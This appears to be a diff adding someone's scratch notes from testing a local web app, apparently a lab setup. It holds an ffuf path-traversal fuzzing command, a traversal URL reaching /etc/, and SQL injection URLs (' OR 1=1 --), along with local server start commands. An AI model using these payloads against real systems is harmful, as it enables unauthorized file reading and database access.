@@ -1,0 +1,15 @@
+ffuf -u 'http://localhost:8081/portal/vault/view.php?file=../../FUZZ' -w /usr/share/dict/words -mc all
+
+wget -r -l 15 --spider --no-check-certificate http://localhost:8081/portal/vault/  
+
+http://localhost:8081/portal/vault/view.php?file=../../../etc/
+
+http://localhost:10101/api/v1/search?pid=%27%20OR%201=1%20 1=1
+
+http://localhost:10101/api/v1/search?pid=%27%20OR%201=1%20-- ##this is my sql injection request 
+
+http://localhost:8081/portal/index.html
+
+php -S localhost:8081
+
+ brew services restart openresty
